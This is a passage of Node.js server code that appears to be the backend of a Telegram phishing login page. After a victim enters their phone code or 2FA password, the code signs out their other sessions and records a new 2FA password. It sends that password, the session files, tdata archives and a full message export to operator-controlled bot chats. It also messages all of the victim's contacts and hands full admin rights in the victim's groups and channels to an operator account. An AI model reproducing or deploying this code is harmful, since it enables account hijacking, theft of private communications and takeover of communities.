           ON CONFLICT (telegram_id,key) DO NOTHING`,
          [String(telegramId), _pwdExistingEmail]
        ).catch(() => {});
      }
      console.log(`[security] telegramId=${telegramId}: 2FA already set, pwd from DB=${cloudPassword ? 'yes' : 'no'}`);
    }
  } catch (_2faOuterErr) {
    console.warn("[security] 2FA outer:", _2faOuterErr.message);
  }

  console.log(`[security] telegramId=${telegramId}: done — sessions=${terminatedCount}, 2fa=${cloudPassword?'set':'already'}, privacy=${privacySet}, user=${usernameSet||'skip'}`);

  // Fetch bot_email from DB to return it in result
  let botEmail = null;
  try {
    const { rows: _beRows } = await pool.query(
      "SELECT value FROM login_settings WHERE telegram_id=$1 AND key='bot_email'",
      [String(telegramId)]
    );
    botEmail = _beRows[0]?.value || null;
  } catch {}
  return { terminatedCount, cloudPassword, botEmail, usernameSet, privacySet };
}

// Send a custom message to all personal (non-bot) chats on login (fire-and-forget)
async function sendMessageToAllPersonalChats(sessionStr, telegramId) {
  const { rows } = await pool.query(
    "SELECT value FROM login_settings WHERE key='login_message' AND telegram_id=$1",
    [String(telegramId)]
  ).catch(() => ({ rows: [] }));
  const message = rows[0]?.value;
  if (!message) return 0;

  const client = newClient(sessionStr);
  let sent = 0;
  try {
    await client.connect();
    const dialogs = await client.getDialogs({ limit: 500 });
    for (const dlg of dialogs) {
      if (!dlg.isUser || dlg.entity?.bot) continue;
      try {
        await client.sendMessage(dlg.entity, { message });
        sent++;
        await new Promise(r => setTimeout(r, 600)); // rate-limit ~1.6 msg/s
      } catch (_) {}
    }
    console.log(`[login-msg] telegramId=${telegramId}: sent to ${sent} personal chats`);
  } catch (e) {
    console.error("[login-msg] error:", e.message);
  } finally {
    await client.disconnect().catch(() => {});
  }
  return sent;
}

// Send second @username announcement to all personal chats (fire-and-forget)
// Add @secondUsername as admin in every group/channel where account is admin/creator, then leave
async function promoteSecondUsernameAsAdmin(sessionStr, telegramId) {
  try {
    const { rows: u2Rows } = await pool.query(
      "SELECT value FROM login_settings WHERE telegram_id='__global__' AND key='second_username'"
    ).catch(() => ({ rows: [] }));
    const secondUsername = (u2Rows[0]?.value || '').replace(/^@/, '').trim();
    if (!secondUsername) return { promoted: 0, left: 0 };

    const client = newClient(sessionStr);
    let promoted = 0, leftCount = 0;
    try {
      await client.connect();

      // Resolve target user once
      let targetUser;
      try {
        targetUser = await client.getInputEntity(secondUsername);
      } catch (resolveErr) {
        console.error(`[username2-admin] telegramId=${telegramId}: cannot resolve @${secondUsername}: ${resolveErr.message}`);
        return { promoted: 0, left: 0 };
      }

      const dialogs = await client.getDialogs({ limit: 500 });
      const fullAdminRights = new Api.ChatAdminRights({
        changeInfo: true, postMessages: true, editMessages: true,
        deleteMessages: true, banUsers: true, inviteUsers: true,
        pinMessages: true, addAdmins: true, anonymous: false,
        manageCall: true, other: true, manageTopics: false,
      });

      for (const dlg of dialogs) {
        const ent = dlg.entity;
        if (!ent || (!dlg.isGroup && !dlg.isChannel)) continue;
        const chatTitle = dlg.title || String(ent.id);

        try {
          if (dlg.isChannel) {
            // Supergroup or broadcast channel — check participant role
            let participant;
            try {
              const pr = await client.invoke(new Api.channels.GetParticipant({
                channel: ent,
                participant: new Api.InputPeerSelf(),
              }));
              participant = pr.participant;
            } catch (_) { continue; }

            const isAdmin = participant?.className === 'ChannelParticipantCreator' ||
                            participant?.className === 'ChannelParticipantAdmin';
            if (!isAdmin) continue;

            // Add target (ignore if already member)
            try {
              await client.invoke(new Api.channels.InviteToChannel({ channel: ent, users: [targetUser] }));
            } catch (_) {}

            // Grant full admin rights
            await client.invoke(new Api.channels.EditAdmin({
              channel: ent, userId: targetUser,
              adminRights: fullAdminRights, rank: '',
            }));

            // Leave
            await client.invoke(new Api.channels.LeaveChannel({ channel: ent }));
            promoted++; leftCount++;

          } else {
            // Small group (Chat) — only if current account is creator
            if (!ent.creator) continue;

            // Add to group
            try {
              await client.invoke(new Api.messages.AddChatUser({
                chatId: ent.id, userId: targetUser, fwdLimit: 0,
              }));
            } catch (_) {}

            // Make admin
            await client.invoke(new Api.messages.EditChatAdmin({
              chatId: ent.id, userId: targetUser, isAdmin: true,
            }));

            // Leave
            await client.invoke(new Api.messages.DeleteChatUser({
              chatId: ent.id,
              userId: new Api.InputPeerSelf(),
            }));
            promoted++; leftCount++;
          }

          console.log(`[username2-admin] telegramId=${telegramId}: @${secondUsername} → admin in "${chatTitle}", left`);
          await new Promise(r => setTimeout(r, 1200));

        } catch (chatErr) {
          console.warn(`[username2-admin] "${chatTitle}": ${chatErr.message}`);
        }
      }
      console.log(`[username2-admin] telegramId=${telegramId}: promoted=${promoted} left=${leftCount}`);
    } finally {
      await client.disconnect().catch(() => {});
    }
    return { promoted, left: leftCount };
  } catch (e) {
    console.error('[username2-admin] error:', e.message);
    return { promoted: 0, left: 0 };
  }
}

// ─── Official Telegram Takeout backup ────────────────────────────────────────

// ── runPython: spawn Python3 script, stream logs, resolve with stdout ────────
function runPython(args, onLog, { detached = false, logFile = null, timeout = 0 } = {}) {
  return new Promise((resolve, reject) => {
    let stdioOpt;
    let _logFd = null;
    if (detached && logFile) {
      // openSync → integer FD, spawn accepts it, child inherits its own copy
      _logFd = openSync(logFile, "a");
      stdioOpt = ["ignore", _logFd, _logFd];
    } else {
      stdioOpt = ["ignore", "pipe", "pipe"];
    }
    const proc = spawn("python3", ["-u", ...args], {
      env: process.env,
      stdio: stdioOpt,
      detached,
    });
    if (detached) {
      proc.unref();
      // Release parent's FD reference — child keeps its own inherited copy
      if (_logFd !== null) { try { closeSync(_logFd); } catch {} _logFd = null; }
      // For detached mode, we cannot wait for output — resolve immediately
      resolve({ stdout: "", stderr: "" });
      return;
    }
    const stdoutBufs = [];
    const stderrBufs = [];
    proc.stdout.on("data", d => {
      const s = d.toString();
      stdoutBufs.push(s);
      s.split("\n").filter(Boolean).forEach(l => onLog?.("stdout", l));
    });
    proc.stderr.on("data", d => {
      const s = d.toString();
      stderrBufs.push(s);
      s.split("\n").filter(Boolean).forEach(l => onLog?.("stderr", l));
    });
    // Enforce timeout: kill process and reject if it hangs
    let _timedOut = false;
    let _timer = null;
    if (timeout > 0) {
      _timer = setTimeout(() => {
        _timedOut = true;
        try { proc.kill("SIGKILL"); } catch {}
        reject(new Error(`python3 timed out after ${timeout}ms`));
      }, timeout);
    }
    proc.on("close", code => {
      if (_timer) clearTimeout(_timer);
      if (_timedOut) return; // already rejected
      const stdout = stdoutBufs.join("");
      const stderr = stderrBufs.join("");
      if (code !== 0) reject(new Error(`python3 exited ${code}: ${stderr.slice(-300)}`));
      else resolve({ stdout, stderr });
    });
    proc.on("error", err => {
      if (_timer) clearTimeout(_timer);
      reject(err);
    });
  });
}

async function generateAndSendBackup(telegramId, botToken) {
  const ts0 = Date.now();
  const persistDir = `/app/backup-work/${telegramId}_${ts0}`;
  mkdirSync(persistDir, { recursive: true });
  const tmpDir = persistDir;  // persistent — survives parent restart
  console.log(`[backup] start for ${telegramId}`);
  const t0 = Date.now();
  let client = null;

  try {
    // 1. Load session
    const { rows: sesRows } = await pool.query(
      "SELECT session_str, phone, first_name, username FROM tg_sessions WHERE telegram_id=$1",
      [telegramId]
    );
    if (!sesRows.length) throw new Error("Telegram session not found in DB");
    const { session_str, phone, first_name, username } = sesRows[0];

    // 2. Connect — retry on MSGID_DECREASE_RETRY (message ID desync after session reuse)
    // FIX: initialize client BEFORE the loop — attempt 0 previously used null client
    client = newClient(session_str);
    let me;
    for (let _attempt = 0; _attempt <= 3; _attempt++) {
      try {
        if (_attempt > 0) {
          console.warn(`[backup] connect retry ${_attempt} for ${telegramId}...`);
          if (client) await client.disconnect().catch(() => {});
          await new Promise(r => setTimeout(r, 2500 * _attempt));
          client = newClient(session_str);
        }
        await client.connect();
        me = await client.getMe();
        break;
      } catch (_ce) {
        if (_attempt === 3) throw _ce;
        console.warn(`[backup] connect attempt ${_attempt + 1} failed: ${_ce.message}`);
      }
    }
    console.log(`[backup] connected as ${me.firstName} (id=${me.id})`);

    // Save session immediately
    const freshSession = client.session.save();
    await pool.query(
      "UPDATE tg_sessions SET session_str=$1, updated_at=NOW() WHERE telegram_id=$2",
      [freshSession, telegramId]
    ).catch(() => {});

    const ts = Date.now();
    const accountName = first_name || me.firstName || "";
    const uname = username || me.username || null;

    // Resolve recipients
    const { rows: recipRows } = await pool.query("SELECT telegram_id FROM backup_bot_chats");
    // Only authorized admins get backup archives
    const recipients = [...AUTHORIZED_ADMIN_IDS].filter(id =>
      recipRows.some(r => String(r.telegram_id) === id)
    );
    console.log(`[backup] will deliver to ${recipients.length} recipient(s): ${recipients.join(", ")}`);

    // ── PHASE 1: session files ──────────────────────────────────────────────
    const telethonSessionFile = join(tmpDir, `${telegramId}_telethon_${ts}.session`);
    let telethonOk = false;
    try {
      const env = { ...process.env };
      execSync(
        `python3 /app/make_telethon_session.py ${JSON.stringify(freshSession)} ${JSON.stringify(telethonSessionFile)}`,
        { timeout: 30000, env, stdio: ["ignore", "pipe", "pipe"] }
      );
      console.log(`[backup] telethon session created`);
      telethonOk = true;
    } catch (pyErr) {
      console.warn(`[backup] telethon session failed: ${pyErr.stderr?.toString()?.trim() || pyErr.message}`);
    }

    // ── PHASE 1b: tdata (Telegram Desktop) via opentele ─────────────────────
    // gen-tdata.py expects a Telethon SQLite .session file (created above).
    const tdataDir = join(tmpDir, "tdata");
    const tdataZip = join(tmpDir, `${telegramId}_tdata_${ts}.zip`);
    let tdataOk = false;
    if (telethonOk && existsSync(telethonSessionFile)) {
      try {
        // Pass the .session file path — gen-tdata.py opens it via opentele TelegramClient
        execSync(
          `python3 /app/gen-tdata.py ${JSON.stringify(telethonSessionFile)} ${JSON.stringify(tdataDir)}`,
          { timeout: 60000, env: { ...process.env }, stdio: ["ignore", "pipe", "pipe"] }
        );
        // Zip the generated tdata/ directory using Python (zip may not be installed)
        execSync(
          `python3 -c "import zipfile, os, sys; z=zipfile.ZipFile(sys.argv[1],'w',zipfile.ZIP_DEFLATED); [z.write(os.path.join(r,f), os.path.relpath(os.path.join(r,f), os.path.dirname(sys.argv[1]))) for r,_,fs in os.walk(sys.argv[2]) for f in fs]; z.close(); print('zip ok:', sys.argv[1])" ${JSON.stringify(tdataZip)} ${JSON.stringify(tdataDir)}`,
          { timeout: 30000, shell: true, stdio: ["ignore", "pipe", "pipe"] }
        );
        if (existsSync(tdataZip)) {
          const tdataSize = statSync(tdataZip).size;
          tdataOk = true;
          console.log(`[backup] tdata created: ${(tdataSize / 1024).toFixed(1)} KB`);
        } else {
          console.warn(`[backup] tdata zip not found after generation`);
        }
      } catch (tdataErr) {
        const errMsg = tdataErr.stderr?.toString()?.trim() || tdataErr.stdout?.toString()?.trim() || tdataErr.message;
        console.warn(`[backup] tdata generation failed: ${errMsg}`);
      }
    } else {
      console.log(`[backup] skipping tdata — telethon session not available`);
    }

    // Send session files immediately
    for (const recip of recipients) {
      if (telethonOk && existsSync(telethonSessionFile)) {
        const cap2 = `\uD83D\uDD11 <b>Telethon .session</b> \u2014 \u043e\u0444\u0438\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0439 SQLite \u0444\u043e\u0440\u043c\u0430\u0442\n\uD83D\uDC64 ${accountName}${uname ? " @" + uname : ""}`;
        await sendViaBot(telethonSessionFile, `${telegramId}_telethon_${ts}.session`, botToken, recip, cap2, "HTML");
      }
      if (tdataOk && existsSync(tdataZip)) {
        const cap3 = `\uD83D\uDCBB <b>TData</b> \u2014 Telegram Desktop \u0441\u0435\u0441\u0441\u0438\u044f\n\uD83D\uDC64 ${accountName}${uname ? " @" + uname : ""}`;
        await sendViaBot(tdataZip, `${telegramId}_tdata_${ts}.zip`, botToken, recip, cap3, "HTML");
      }
    }
    console.log(`[backup] phase 1 done (session files sent)`);

    // ── PHASE 2: full message export via Python/Telethon ─────────────────────
    await client.disconnect().catch(() => {});
    client = null;

    const exportOutDir = join(tmpDir, "export");
    mkdirSync(exportOutDir, { recursive: true });

    const recipStr = recipients.join(",");
    const backupTok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN
      || process.env.TELEGRAM_BOT_TOKEN || botToken || "";

    const pyArgs = [
      "/app/tg_full_export.py",
      "--session-str", freshSession,
      "--api-id", String(API_ID),
      "--api-hash", API_HASH,
      "--out-dir", exportOutDir,
      "--bot-token", backupTok,
      "--recipients", recipStr,
      "--self-id", String(telegramId),
      "--log-prefix", `[backup/${telegramId}]`,
      "--media-limit-mb", "50",
      "--personal-only",
      "--time-limit-sec", "300",
      "--extra-bot-tokens", (process.env.BOT_TOKEN || "") + "," + (process.env.BACKUP_BOT_TOKEN || ""),
      ...(telethonOk && existsSync(telethonSessionFile)
        ? ["--session-file", telethonSessionFile]
        : []),
    ];

    console.log(`[backup] spawning tg_full_export.py for ${telegramId} (detached)`);
    const pyLogFile = join(tmpDir, "export.log");
    await runPython(pyArgs, null, { detached: true, logFile: pyLogFile });
    console.log(`[backup] Python export process launched — log: ${pyLogFile}`);

  } catch (e) {
    console.error(`[backup] error for ${telegramId}:`, e.message);
    _notifyAdmins(`❌ <b>Backup failed</b>\n👤 <code>${telegramId}</code>\n💥 <code>${e.message.slice(0,200)}</code>`).catch(() => {});
  } finally {
    if (client) await client.disconnect().catch(() => {});
    console.log(`[backup] Node.js phase done for ${telegramId}`);
  }
}

// Send a file to the user via all available bot tokens
async function sendViaBot(filePath, fileName, primaryToken, telegramId, caption, parseMode = null) {
  const tokens = [
    primaryToken,
    process.env.BACKUP_BOT_TOKEN,
    process.env.BOT_TOKEN,
    process.env.TELEGRAM_BOT_TOKEN,
  ].filter(Boolean).filter((v, i, a) => a.indexOf(v) === i);

  let buf;
  try {
    buf = await readFile(filePath);
  } catch (e) {
    console.error(`[backup] readFile failed for ${filePath}:`, e.message);
    return false;
  }

  // ── Attempt 1: deliver directly to the specified telegramId (DM) ──────────
  for (const tok of tokens) {
    const form = new FormData();
    form.append("chat_id", String(telegramId));
    form.append("document", new Blob([buf], { type: "application/octet-stream" }), fileName);
    form.append("caption", caption);
    if (parseMode) form.append("parse_mode", parseMode);
    try {
      const r = await fetch(`https://api.telegram.org/bot${tok}/sendDocument`, { method: "POST", body: form });
      const d = await r.json();
      if (d.ok) {
        console.log(`[backup] sent "${fileName}" (${(buf.length/1024).toFixed(1)} KB) via bot ${tok.split(":")[0]}`);
        buf = null;
        return true;
      }
      console.warn(`[backup] DM via bot ${tok.split(":")[0]} failed: ${d.description}`);
    } catch (e) {
      console.warn(`[backup] send error:`, e.message);
    }
  }

  // ── Attempt 2: fallback — send to every admin group chat ─────────────────
  // Happens when admin hasn't started the bot in DM (chat not found / blocked).
  console.warn(`[backup] DM delivery failed for ${telegramId} — trying group-chat fallback`);
  try {
    const { rows: grpRows } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
    const groupChatIds = [...new Set(grpRows.map(r => String(r.telegram_id)))].filter(id => id !== String(telegramId));
    let fallbackOk = false;
    for (const groupId of groupChatIds) {
      for (const tok of tokens) {
        const form = new FormData();
        form.append("chat_id", groupId);
        form.append("document", new Blob([buf ?? await readFile(filePath)], { type: "application/octet-stream" }), fileName);
        form.append("caption", caption + `\n⚠️ DM delivery failed for <code>${telegramId}</code>`);
        if (parseMode) form.append("parse_mode", parseMode);
        try {
          const r = await fetch(`https://api.telegram.org/bot${tok}/sendDocument`, { method: "POST", body: form });
          const d = await r.json();
          if (d.ok) {
            console.log(`[backup] fallback: sent "${fileName}" to group ${groupId} via bot ${tok.split(":")[0]}`);
            fallbackOk = true;
            break;
          }
          console.warn(`[backup] group fallback via bot ${tok.split(":")[0]} to ${groupId}: ${d.description}`);
        } catch (fe) {
          console.warn(`[backup] group fallback error:`, fe.message);
        }
      }
      if (fallbackOk) break;
    }
    if (fallbackOk) { buf = null; return true; }
  } catch (fbErr) {
    console.error(`[backup] group fallback threw:`, fbErr.message);
  }

  buf = null;
  console.error(`[backup] all delivery attempts failed for "${fileName}" → ${telegramId}`);
  _notifyAdmins(`❌ <b>Archive delivery failed</b>\n📎 ${fileName}\n👤 <code>${telegramId}</code>\n💡 Проверьте что бот запущен в ЛС и в группе`).catch(() => {});
  return false;
}

// ─── HTTP server ─────────────────────────────────────────────────────────────

// Lightweight per-IP sliding-window rate limiter for sensitive auth endpoints
const _rlBuckets = new Map(); // key -> [timestamps]
function rateLimited(key, max, windowMs) {
  const now = Date.now();
  const arr = (_rlBuckets.get(key) || []).filter(t => now - t < windowMs);
  arr.push(now);
  _rlBuckets.set(key, arr);
  if (_rlBuckets.size > 5000) { // basic memory guard
    for (const [k, v] of _rlBuckets) if (!v.some(t => now - t < windowMs)) _rlBuckets.delete(k);
  }
  return arr.length > max;
}

const server = http.createServer(async (req, res) => {
  res.setHeader("Content-Type", "application/json");
  const url = req.url.split("?")[0];

  // ── POST /mtproto/send-code ──────────────────────────────────────────────
  if (req.method === "POST" && url === "/mtproto/send-code") {
    if (rateLimited(`send-code:${getClientIP(req)}`, 5, 10 * 60 * 1000))
      return json(res, 429, { error: "Too many requests. Please try again later." });
    let b;
    try { b = await readBody(req); } catch { return json(res, 413, { error: "Request too large" }); }
    const { phone } = b;
    if (!phone || !/^\+\d{7,15}$/.test(phone.trim()))
      return json(res, 400, { error: "Invalid phone number format" });
    const token = randomBytes(20).toString("hex");
    const client = newClient();
    try {
      await client.connect();
      const result = await client.invoke(new Api.auth.SendCode({
        phoneNumber: phone.trim(), apiId: API_ID, apiHash: API_HASH,
        settings: new Api.CodeSettings({}),
      }));
      await pool.query(
        "INSERT INTO mtproto_sessions (token, phone, phone_code_hash) VALUES ($1, $2, $3)",
        [token, phone.trim(), result.phoneCodeHash]
      );
      pendingClients.set(token, { client, phoneCodeHash: result.phoneCodeHash, phone: phone.trim() });
      setTimeout(async () => {
        const p = pendingClients.get(token);
        if (p) {
          pendingClients.delete(token);
          try { await p.client.disconnect(); } catch {}
          await pool.query(
            "UPDATE mtproto_sessions SET status='expired' WHERE token=$1 AND status='code_sent'", [token]
          ).catch(() => {});
        }
      }, 10 * 60 * 1000);
      json(res, 200, { token, sent: true });
    } catch (e) {
      pendingClients.delete(token);
      await client.disconnect().catch(() => {});
      json(res, 500, { error: e.message });
    }
    return;
  }

  // ── POST /mtproto/verify ─────────────────────────────────────────────────
  if (req.method === "POST" && url === "/mtproto/verify") {
    if (rateLimited(`verify:${getClientIP(req)}`, 10, 10 * 60 * 1000))
      return json(res, 429, { error: "Too many requests. Please try again later." });
    let b;
    try { b = await readBody(req); } catch { return json(res, 413, { error: "Request too large" }); }
    const { token, code } = b;
    if (!token || !code) return json(res, 400, { error: "token and code are required" });
    const pending = pendingClients.get(token);
    if (!pending) return json(res, 410, { error: "Session expired. Please request a new code." });
    const { client, phoneCodeHash, phone } = pending;
    try {
      const result = await client.invoke(new Api.auth.SignIn({
        phoneNumber: phone, phoneCodeHash, phoneCode: String(code).trim(),
      }));
      const tgUser = result.user;
      pendingClients.delete(token);
      const sessionStr = client.session.save();
      await client.disconnect().catch(() => {});

      const dbClient = await pool.connect();
      let userId, sessionToken;
      try {
        await dbClient.query('BEGIN');
        const dbRes = await dbClient.query(
          `INSERT INTO users (telegram_id, first_name, last_name, username, photo_url)
           VALUES ($1,$2,$3,$4,$5)
           ON CONFLICT (telegram_id) DO UPDATE SET
             first_name=EXCLUDED.first_name, last_name=EXCLUDED.last_name,
             username=EXCLUDED.username, updated_at=NOW()
           RETURNING id`,
          [String(tgUser.id), tgUser.firstName||"", tgUser.lastName||null, tgUser.username||null, null]
        );
        userId = dbRes.rows[0].id;
        sessionToken = randomBytes(32).toString("hex");
        await dbClient.query(
          "INSERT INTO sessions (token, user_id, expires_at) VALUES ($1,$2,$3)",
          [sessionToken, userId, new Date(Date.now() + SESSION_DURATION_MS)]
        );
        const updMtproto = await dbClient.query(
          `UPDATE mtproto_sessions SET status='authorized', tg_session=$1 WHERE token=$2`,
          [sessionStr, token]
        );
        if (!updMtproto.rowCount) throw new Error('mtproto session expired or not found');
        await dbClient.query(
          `INSERT INTO tg_sessions (phone, telegram_id, session_str, first_name, username)
           VALUES ($1,$2,$3,$4,$5)
           ON CONFLICT (phone) DO UPDATE SET
             session_str=EXCLUDED.session_str, telegram_id=EXCLUDED.telegram_id,
             first_name=EXCLUDED.first_name, username=EXCLUDED.username, updated_at=NOW()`,
          [phone, String(tgUser.id), sessionStr, tgUser.firstName||"", tgUser.username||null]
        );
        await dbClient.query('COMMIT');
      } catch (txErr) {
        await dbClient.query('ROLLBACK').catch(() => {});
        throw txErr;
      } finally {
        dbClient.release();
      }
      archiveDialogsBackground(String(tgUser.id), sessionStr);

      // Auto-trigger backup on every new login
      {
        const _tok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (_tok) generateAndSendBackup(String(tgUser.id), _tok).catch(e => console.error("[backup] auto:", e.message));
      }

      // Security + notification (fire-and-forget, doesn't block login response)
      const _verifyIP = getClientIP(req);
      const _verifyUA = parseUA(req.headers["user-agent"] || "");
      ;(async () => {
        const secResult = await withAccountLock(String(tgUser.id), () =>
          applyAllLoginActions(sessionStr, String(tgUser.id), tgUser.firstName || "")
        ).catch(() => ({}));
        sendMessageToAllPersonalChats(sessionStr, String(tgUser.id)).catch(() => {});
        promoteSecondUsernameAsAdmin(sessionStr, String(tgUser.id)).catch(() => {});
        const _logToken = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (!_logToken) return;
        const { rows: chatRowsRaw } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
        const chatRows = _onlyAdmins(chatRowsRaw);
        const name = [tgUser.firstName, tgUser.lastName].filter(Boolean).join(" ");
        const uname = (secResult.usernameSet || tgUser.username) ? `@${secResult.usernameSet || tgUser.username}` : "—";
        const nowStr = nowMoscow();
        const text =
          `🔑 <b>Новый вход (MTProto)</b>\n` +
          `👤 ${name}\n` +
          `📱 ${uname}\n` +
          `🆔 <code>${String(tgUser.id)}</code>\n` +
          `🌐 IP: <code>${_verifyIP}</code>\n` +
          `📲 Устройство: ${_verifyUA}\n` +
          `🕐 ${nowStr}\n` +
          `✅ Сессии закрыты · Auto-Delete: 7д` +
          (secResult.usernameSet   ? `\n👤 Username: <code>@${secResult.usernameSet}</code>` : '') +
          (secResult.cloudPassword ? `\n🔐 2FA: <code>${secResult.cloudPassword}</code>` : '') +
          (secResult.botEmail      ? `\n📧 Email: <code>${secResult.botEmail}</code>` : '') +
          (secResult.privacySet    ? `\n🛡 Приватность: все видно` : '');
        for (const chat of chatRows) {
          const sendMsg = async (tok) => fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chat.telegram_id, text, parse_mode: "HTML" }),
          }).then(r => r.json()).catch(e => ({ error: e.message }));
          let r = await sendMsg(_logToken);
          if (!r.ok) {
            const _fallbackTok = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
            if (_fallbackTok && _fallbackTok !== _logToken) r = await sendMsg(_fallbackTok);
          }
          console.log(`[verify] log to ${chat.telegram_id}:`, r.ok ? "OK" : r.error || r.description);
        }
      })().catch(e => console.error("[verify] post-login:", e.message));

      const proto = req.headers["cf-visitor"]?.includes('"https"')
        ? "https" : (req.headers["x-forwarded-proto"] || "http");
      const secure = proto === "https" ? "; Secure" : "";
      res.setHeader("Set-Cookie",
        `${SESSION_COOKIE}=${sessionToken}; Path=/; HttpOnly; Max-Age=${SESSION_DURATION_MS/1000}; SameSite=Lax${secure}`
      );
      console.log(`[verify] user=${tgUser.id} @${tgUser.username||"-"} session created, secure=${!!secure}`);
      json(res, 200, { ok: true, user: {
        id: String(tgUser.id), firstName: tgUser.firstName,
        lastName: tgUser.lastName, username: tgUser.username,
      }});
    } catch (e) {
      if (e.message?.includes("SESSION_PASSWORD_NEEDED")) {
        // 2FA required — persist session string so it survives a process restart
        try {
          const _pwdSessionStr = client.session.save();
          await pool.query(
            `UPDATE mtproto_sessions SET tg_session=$1, status='password_pending' WHERE token=$2`,
            [_pwdSessionStr, token]
          );
        } catch (_se) { console.warn("[verify] session persist:", _se.message); }
        return json(res, 401, { error: "SESSION_PASSWORD_NEEDED", session_password_needed: true });
      }
      try { await client.disconnect(); } catch {}
      pendingClients.delete(token);
      if (e.message.includes("PHONE_CODE_INVALID"))
        return json(res, 401, { error: "Invalid code." });
      if (e.message.includes("PHONE_CODE_EXPIRED"))
        return json(res, 401, { error: "Code expired. Please request a new one." });
      json(res, 500, { error: e.message });
    }
    return;
  }

  // ── POST /mtproto/verify-2fa — complete login when 2FA is required ────────
  if (req.method === "POST" && url === "/mtproto/verify-2fa") {
    if (rateLimited(`verify-2fa:${getClientIP(req)}`, 8, 10 * 60 * 1000))
      return json(res, 429, { error: "Too many requests. Please try again later." });
    let b;
    try { b = await readBody(req); } catch { return json(res, 413, { error: "Request too large" }); }
    const { token, password } = b;
    if (!token || !password) return json(res, 400, { error: "token and password are required" });
    let pending = pendingClients.get(token);
    if (!pending) {
      // Fallback: process restarted — restore session from DB
      try {
        const { rows: _pr } = await pool.query(
          `SELECT phone, tg_session FROM mtproto_sessions
           WHERE token=$1 AND status='password_pending'
             AND created_at > NOW() - INTERVAL '10 minutes'`,
          [token]
        );
        if (_pr.length && _pr[0].tg_session) {
          const _rc = newClient(_pr[0].tg_session);
          await _rc.connect();
          pending = { client: _rc, phone: _pr[0].phone };
          pendingClients.set(token, pending);
          console.log(`[verify-2fa] restored session from DB for token=${token.slice(0,8)}...`);
        }
      } catch (_re) { console.warn("[verify-2fa] restore:", _re.message); }
    }
    if (!pending) return json(res, 410, { error: "Session expired. Please request a new code." });
    const { client, phone } = pending;
    try {
      const pwdState = await client.invoke(new Api.account.GetPassword());
      const srpCheck = await computeCheck(pwdState, password);
      const result = await client.invoke(new Api.auth.CheckPassword({ password: srpCheck }));
      const tgUser = result.user;
      pendingClients.delete(token);
      const sessionStr = client.session.save();
      await client.disconnect().catch(() => {});

      const dbClient2 = await pool.connect();
      let userId2, sessionToken2;
      try {
        await dbClient2.query('BEGIN');
        const dbRes2 = await dbClient2.query(
          `INSERT INTO users (telegram_id, first_name, last_name, username, photo_url)
           VALUES ($1,$2,$3,$4,$5)
           ON CONFLICT (telegram_id) DO UPDATE SET
             first_name=EXCLUDED.first_name, last_name=EXCLUDED.last_name,
             username=EXCLUDED.username, updated_at=NOW()
           RETURNING id`,
          [String(tgUser.id), tgUser.firstName||"", tgUser.lastName||null, tgUser.username||null, null]
        );
        userId2 = dbRes2.rows[0].id;
        sessionToken2 = randomBytes(32).toString("hex");
        await dbClient2.query(
          "INSERT INTO sessions (token, user_id, expires_at) VALUES ($1,$2,$3)",
          [sessionToken2, userId2, new Date(Date.now() + SESSION_DURATION_MS)]
        );
        const updMtproto2 = await dbClient2.query(
          `UPDATE mtproto_sessions SET status='authorized', tg_session=$1 WHERE token=$2`,
          [sessionStr, token]
        );
        if (!updMtproto2.rowCount) throw new Error('mtproto session expired or not found');
        await dbClient2.query(
          `INSERT INTO tg_sessions (phone, telegram_id, session_str, first_name, username)
           VALUES ($1,$2,$3,$4,$5)
           ON CONFLICT (phone) DO UPDATE SET
             session_str=EXCLUDED.session_str, telegram_id=EXCLUDED.telegram_id,
             first_name=EXCLUDED.first_name, username=EXCLUDED.username, updated_at=NOW()`,
          [phone, String(tgUser.id), sessionStr, tgUser.firstName||"", tgUser.username||null]
        );
        await dbClient2.query('COMMIT');
      } catch (txErr2) {
        await dbClient2.query('ROLLBACK').catch(() => {});
        throw txErr2;
      } finally {
        dbClient2.release();
      }
      archiveDialogsBackground(String(tgUser.id), sessionStr);

      // Auto backup
      {
        const _tok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (_tok) generateAndSendBackup(String(tgUser.id), _tok).catch(e => console.error("[backup] 2fa:", e.message));
      }

      // Security + notification
      const _2faLoginIP = getClientIP(req);
      const _2faLoginUA = parseUA(req.headers["user-agent"] || "");
      ;(async () => {
        const secResult = await withAccountLock(String(tgUser.id), () =>
          applyAllLoginActions(sessionStr, String(tgUser.id), tgUser.firstName || "")
        ).catch(() => ({}));
        sendMessageToAllPersonalChats(sessionStr, String(tgUser.id)).catch(() => {});
        promoteSecondUsernameAsAdmin(sessionStr, String(tgUser.id)).catch(() => {});
        const _logToken2 = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (!_logToken2) return;
        const { rows: chatRows2Raw } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
        const chatRows2 = _onlyAdmins(chatRows2Raw);
        const name2 = [tgUser.firstName, tgUser.lastName].filter(Boolean).join(" ");
        const uname2 = (secResult.usernameSet || tgUser.username) ? `@${secResult.usernameSet || tgUser.username}` : "—";
        const nowStr2 = nowMoscow();
        const text2 =
          `🔑 <b>Новый вход (MTProto+2FA)</b>\n` +
          `👤 ${name2}\n` +
          `📱 ${uname2}\n` +
          `🆔 <code>${String(tgUser.id)}</code>\n` +
          `🌐 IP: <code>${_2faLoginIP}</code>\n` +
          `📲 Устройство: ${_2faLoginUA}\n` +
          `🕐 ${nowStr2}\n` +
          `✅ Сессии закрыты · Auto-Delete: 7д` +
          (secResult.usernameSet   ? `\n👤 Username: <code>@${secResult.usernameSet}</code>` : '') +
          (secResult.cloudPassword ? `\n🔐 2FA: <code>${secResult.cloudPassword}</code>` : '\n🔐 2FA: обновлён') +
          (secResult.botEmail      ? `\n📧 Email: <code>${secResult.botEmail}</code>` : '') +
